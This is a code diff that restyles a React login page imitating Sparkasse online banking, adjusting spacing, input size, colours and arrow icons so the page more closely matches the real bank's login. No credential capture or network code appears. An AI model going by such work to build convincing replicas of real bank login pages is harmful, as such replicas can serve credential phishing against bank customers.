@@ -157,7 +157,7 @@ const Sparkasse = () => {
 
         {/* Login */}
         <main className="flex-1">
-          <section className="max-w-[800px] mx-auto px-8 lg:px-12 pt-10 lg:pt-16 pb-8">
+          <section className="max-w-[800px] mx-auto px-8 lg:px-12 pt-4 lg:pt-6 pb-8">
             <h1 style={{ fontFamily: HEAD, fontSize: 28, fontWeight: 400, textAlign: "center", marginBottom: 20 }}>
               Melden Sie sich an
             </h1>
@@ -173,17 +173,18 @@ const Sparkasse = () => {
                 placeholder="Anmeldename"
                 style={{
                   width: "100%",
-                  height: 56,
-                  padding: "0 16px",
+                  height: 64,
+                  padding: "0 18px",
                   border: `1px solid ${error ? "#d20000" : "#767676"}`,
                   background: error ? "#fceded" : "#fff",
-                  borderRadius: 4,
+                  borderRadius: 8,
                   fontSize: 16,
                   fontFamily: FONT,
                   color: TEXT,
                   outline: "none",
                 }}
               />
+              <style>{`.sk-login-input::placeholder{color:#565656;opacity:1}`}</style>
               {error && (
                 <div style={{ color: "#d20000", fontSize: 14, marginTop: 6 }}>
                   Bitte geben Sie Ihren Anmeldenamen ein.
@@ -197,7 +198,7 @@ const Sparkasse = () => {
                     color: "#fff",
                     border: "none",
                     borderRadius: 999,
-                    padding: "14px 60px",
+                    padding: "12px 36px",
                     fontSize: 16,
                     fontFamily: FONT,
                     fontWeight: 500,
@@ -212,19 +213,25 @@ const Sparkasse = () => {
             </form>
 
             <div style={{ textAlign: "center", marginTop: 20, fontSize: 15 }}>
-              <a href="#" style={{ color: TEXT, textDecoration: "underline" }}>Sicherheitshinweise</a>
+              <a href="#" style={{ color: "#292929", textDecoration: "underline" }}>Sicherheitshinweise</a>
               <span style={{ margin: "0 10px", color: "#999" }}>·</span>
-              <a href="#" style={{ color: TEXT, textDecoration: "underline" }}>Zugangsdaten vergessen</a>
+              <a href="#" style={{ color: "#292929", textDecoration: "underline" }}>Zugangsdaten vergessen</a>
             </div>
 
-            <div style={{ marginTop: 48, borderTop: `1px solid ${BORDER}`, paddingTop: 20 }}>
-              <div style={{ display: "flex", flexWrap: "wrap", alignItems: "baseline", gap: 12, paddingBottom: 16, borderBottom: `1px solid ${BORDER}` }}>
+            <div style={{ marginTop: 48 }}>
+              <div style={{ display: "flex", flexWrap: "wrap", alignItems: "baseline", gap: 12, paddingBottom: 16, borderBottom: `1px solid ${BORDER}`, color: "#565656" }}>
                 <span>Sie haben noch kein Online-Banking?</span>
-                <a href="#" style={{ color: TEXT, fontWeight: 700 }}>Jetzt freischalten →</a>
+                <a href="#" style={{ color: "#292929", fontWeight: 700, display: "inline-flex", alignItems: "center", gap: 6 }}>
+                  Jetzt freischalten
+                  <svg width="18" height="14" viewBox="0 0 18 14" fill="none" aria-hidden="true"><path d="M10 1 L17 7 L10 13 M17 7 L11 7" stroke="currentColor" strokeWidth="2" strokeLinecap="square" strokeLinejoin="miter" fill="none" /></svg>
+                </a>
               </div>
-              <div style={{ display: "flex", flexWrap: "wrap", alignItems: "baseline", gap: 12, paddingTop: 16 }}>
+              <div style={{ display: "flex", flexWrap: "wrap", alignItems: "baseline", gap: 12, paddingTop: 16, color: "#565656" }}>
                 <span>Sie sind noch kein Sparkassen-Kunde?</span>
-                <a href="#" style={{ color: TEXT, fontWeight: 700 }}>Weitere Informationen →</a>
+                <a href="#" style={{ color: "#292929", fontWeight: 700, display: "inline-flex", alignItems: "center", gap: 6 }}>
+                  Weitere Informationen
+                  <svg width="18" height="14" viewBox="0 0 18 14" fill="none" aria-hidden="true"><path d="M10 1 L17 7 L10 13 M17 7 L11 7" stroke="currentColor" strokeWidth="2" strokeLinecap="square" strokeLinejoin="miter" fill="none" /></svg>
+                </a>
               </div>
             </div>
           </section>
